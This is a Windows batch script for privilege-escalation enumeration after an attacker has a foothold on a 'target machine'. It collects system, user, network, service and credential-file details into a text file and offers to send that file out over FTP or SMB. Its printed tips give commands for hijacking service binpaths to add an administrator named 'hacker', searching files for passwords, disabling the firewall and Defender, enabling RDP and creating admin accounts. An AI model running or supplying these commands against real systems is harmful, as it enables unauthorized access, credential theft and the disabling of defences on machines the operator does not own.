echo off
title Windows Priv Esc Batch File
echo [*] Removing output file if you've previously run this script
del privesc-enum.txt
echo [*] If file not found, skip
call :sub > privesc-enum.txt
echo '-------------------------------------------------------------------------------------------------------------------'
echo '  Do you want to send the output back to your machine? If yes, enter your preference, either 1 or 2, else enter 3  '
echo '-------------------------------------------------------------------------------------------------------------------'
ECHO 1.FTP
ECHO 2.SMB
ECHO 3.Do Not Send

REM:: Fetch param1
REM set "IP=%~1"

CHOICE /C 123 /M "[*] Enter an option: "
:: Note - list ERRORLEVELS in decreasing order
IF ERRORLEVEL 3 GOTO DoNotSend
IF ERRORLEVEL 2 GOTO SMB
IF ERRORLEVEL 1 GOTO FTP

:: FTP and SMB transfer parts don't work right now
:FTP
echo [*] Using FTP to send file
REM set /p IP=[*] Enter your IP address:
REM echo open %param1% 21> ftp.txt
echo open IP PORT> ftp.txt
echo USER user>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo PUT privesc-enum.txt >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
echo [*] Finished sending!
GOTO End

:SMB
echo [*] Using SMB to send file
copy privesc-enum.txt \\IP\drive\privesc-enum.txt
echo [*] Finished sending!
GOTO End

:DoNotSend
echo [*] Did not send. Finished!
GOTO End

:End
echo:
echo [*] Remember to delete privesc-enum.txt from the target machine!
exit /b

:sub
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                 System Info								                               '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
systeminfo
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '													Hostname							                                       '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
hostname
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                 Who are we?                                                                                             '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
set user=%username%
echo %username% 
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                     User directory potentially useful files                                                                             '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo [*] TXT FILES:
dir /s/b "C:\Users\%user%\*.txt"
echo:
echo [*] BAT / CMD FILES:
dir /s/b "C:\Users\%user%\*.bat"
dir /s/b "C:\Users\%user%\*.cmd"
echo:
echo [*] PYTHON FILES:
dir /s/b "C:\Users\%user%\*.py"
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                  File Path                                                                                              '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo %path%
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                           Users on the Machine                                                                                          '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
net users
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                           Our User Privileges                                                                                           '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
net user %user%
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                               Program File or Documents or Settings directory contents                                                                 '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
set dir="C:\Program Files\"
set dir2="C:\Documents and Settings\"
IF EXIST %dir%\* (
        echo [*] Program Files directory found, showing contents:
REM        dir %dir%
	dir %dir% > programs.txt
) ELSE ( echo [*] Program Files directory not found, trying something else.. )
IF NOT EXIST %dir%\* (
        echo [*] Since Program Files isn't anywhere, the folder must be Documents and Settings..
REM        dir %dir2%
	dir %dir2% > programs.txt )
)
echo:
echo [*] File contents:
echo:
(for /f "tokens=4,* delims= " %%a in (programs.txt) do echo %%b)
del programs.txt
echo:
echo [*] For reference, here is a list of the folder contents often found in either the Program Files or Documents and Settings directory:
echo:
echo Common Files
echo DVD Maker
echo Internet Explorer
echo Microsoft Silverlight
echo MSBuild
echo Reference Assemblies
echo VMware
echo Windows Defender
echo Windows Mail
echo Windows Media Player
echo Windows NT
echo Windows Photo Viewer
echo Windows Portable Devices
echo Windows Sidebar
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                            Network Interfaces                                                                                           '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
ipconfig /all
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                               Routing table                                                                                             '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
route print
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                    Address Resolution Protocol cache table                                                                              '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
arp -A
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                           Active network connections                                                                                    '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
netstat -ano
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                 Firewall rules (Command used from XP SP2 and up)                                                                        '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
netsh firewall show state
echo:
netsh firewall show config
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                      Checking for AlwaysInstallElevated                                                                                 '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo [*] Checking for AlwaysInstalledElevated
echo:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
echo [*] Finished checking for AlwaysInstalledElevated - If left blank, this is not an avenue for privilege escalation
echo: 
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                Scheduled Tasks                                                                                          '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Next Run Time:" /C:"Task to Run:" /C:"Run As User:"
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                               Running Processes                                                                                         '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
tasklist /V
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                Started Services                                                                                         '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
net start
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                     Checking for Incorrect Permissions on Services                                                                      '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
sc query state= all | findstr "SERVICE_NAME:" > Servicenames.txt
FOR /F "tokens=2 delims= " %%a in (Servicenames.txt) DO @echo %%a > services.txt
FOR /F %%c in (services.txt) DO @sc qc %%c | findstr "BINARY_PATH_NAME" > path.txt
echo [*] Potentially weak permissions:
type path.txt
del path.txt
del services.txt
del Servicenames.txt
echo:
echo [*] If you've found any misconfigured services, you can query the services using Windows sc, then change the binpath to execute your own commands (restart of the service will most likely be needed.)
echo [*] Follow these steps (EXAMPLE - also ignore the quotations, had to put them in there because batch is picky with the use of the less than or greater than sign):
echo "sc config <vuln-service> binpath= 'net user hacker pwned /add'"
echo "sc stop <vuln-service>"
echo "sc start <vuln-service>"
echo "sc config <vuln-service> binpath= 'net localgroup Administrators hacker /add'"
echo "sc stop <vuln-service>"
echo "sc start <vuln-service>"
echo:
echo [*] You might also need to use the depend attribute explicitly (EXAMPLE):
echo "sc stop <vuln-service>"
echo "sc config <vuln-service> binPath= "C:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= """
echo "sc start <vuln-service>"
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                 Checking for files containing pass, cred, vnc or .config                                                                '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
dir /s *pass* == *cred* == *vnc* == *.config*
echo:
echo [*] if you happen to find a potentially interesting file, you can check for a password using the following commands:
echo findstr /si password *.txt
echo findstr /si password *.xml
echo findstr /si password *.ini
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                             Other things to test                                                                                        '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo [*] Other things to test
echo [*] Unattended Installs - Example locations: 
echo C:\Windows\Panther\
echo C:\Windows\Panther\Unattend\
echo C:\Windows\System32\
echo C:\Windows\System32\sysprep\
echo:
echo [*] Finding unquoted paths - Example:
echo icacls "C:\Program Files (x86)\Program Folder"
echo:
echo Use accesschk.exe to find weak access rights (Same thing as weak permissions)
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                Useful Commands                                                                                          '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo [*] Permissions on a folder recursively:
echo cacls *.* /t /e /g domainname\administrator:f (If windows Vista or above, use icacls)
echo:
echo [*] These commands will disable the firewall/defender and enable RDP on the system:
echo netsh advfirewall show allprofiles
echo netsh advfirewall set allprofiles state off
echo netsh firewall set opmode disable
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
echo:
echo [*] Add a new user:
echo net user newadmin pass123 /add
echo net localgroup administrators newadmin /add
echo:
echo [*] Change a users password -
echo "net user <user> <new-password>"
echo:
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                     If you want, send back the file to your machine (Others can use whatever method they want)                                          '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'

REM echo [*] Using FTP to send file back
REM echo open IP PORT> ftp.txt
REM echo USER user>> ftp.txt
REM echo password>> ftp.txt
REM echo bin >> ftp.txt
REM echo PUT privesc-enum.txt >> ftp.txt 
REM echo bye >> ftp.txt
REM ftp -v -n -s:ftp.txt
REM del ftp.txt

echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'
echo '                                                                                                   Finished Running!                                                                                     '
echo '---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'


